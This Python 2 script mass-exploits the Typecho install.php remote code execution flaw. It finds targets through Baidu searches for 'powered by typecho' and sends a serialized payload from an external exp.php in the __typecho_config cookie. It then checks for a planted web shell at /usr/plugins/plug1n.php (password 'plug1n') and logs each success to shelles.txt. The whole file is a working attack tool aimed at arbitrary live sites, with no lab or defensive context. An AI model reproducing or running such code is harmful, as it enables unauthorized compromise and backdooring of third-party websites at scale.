#!/usr/bin/python
#-*- coding: utf-8 -*-
"""
    TypechoInstallRCEGetshellViaSearchEngine
    ~~~~~~
    :author:    jadore <jadore@baimaohui.com.cn>
    :homepage:  https://www.baimaohui.com.cn
    :interpre:  python2
"""
import searchEngine
import requests
import os

class TypechoInstallRCEGetshell:
    def __init__(self):
        self.file = open("shelles.txt", 'a')

    def getshell(self, url):
        shellUrl = ""
        try:
            rsp = requests.get(url + "/install.php");
            if rsp.status_code != 200:
                print '该网站的install.php文件可能已被删除 !!!'
            else:
                print '该网站的install.php文件未被删除,尝试攻击中...!!!'

                typecho_config = os.popen('php exp.php').read()
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
                          'Cookie': 'antispame=1508415662; antispamkey=cc7dffeba8d48da508df125b5a50edbd; PHPSESSID=po1hggbeslfoglbvurjjt2lcg0; __typecho_lang=zh_CN;__typecho_config={typecho_config};'.format(typecho_config=typecho_config),
                          'Referer': url}
                expUrl = url + "/install.php?finish=1"
                requests.get(expUrl,headers=headers,allow_redirects=False)

                shellUrl = url + '/usr/plugins/plug1n.php'
                if requests.get(shellUrl).status_code == 200:
                    print "Getshell success"
                else:
                    print "Getshell Fail!"
        except Exception, e:
            print e
        return shellUrl

    def getshellViaSearchEngine(self, engine, keyword, total):
        lines = []
        se = searchEngine.SearchEngine()
        urls = se.search(engine, keyword, total)
        print urls
        id = 1
        for url in urls:
            shellUrl = self.getshell(url)
            if shellUrl:
                line =  'id : ' + str(id) + '\t shell url : ' + shellUrl + '\t pwd : plug1n\r\n'
                print line
                lines.append(line)
                id = id + 1
        self.file.writelines(lines)
        self.file.close()




if __name__ == '__main__':
    engine = "baidu"
    keyword = "powered by typecho"
    total = 10
    typechoInstallRCEGetshell = TypechoInstallRCEGetshell()
    typechoInstallRCEGetshell.getshellViaSearchEngine(engine, keyword, total)